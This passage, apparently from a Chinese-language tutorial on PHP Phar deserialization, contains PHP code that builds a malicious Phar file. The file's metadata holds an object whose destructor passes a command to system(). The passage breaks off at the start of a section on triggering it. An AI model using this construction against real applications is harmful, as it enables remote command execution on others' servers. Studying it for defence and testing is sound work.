### 2. Phar 文件构造

```php
<?php
class Exploit {
    public $cmd = 'id';

    public function __destruct() {
        system($this->cmd);
    }
}

// 生成 Phar 文件
$phar = new Phar("exploit.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");

$payload = new Exploit();
$phar->setMetadata($payload);  // 恶意对象存入 metadata

$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>
```

### 3. 触发方式

```php
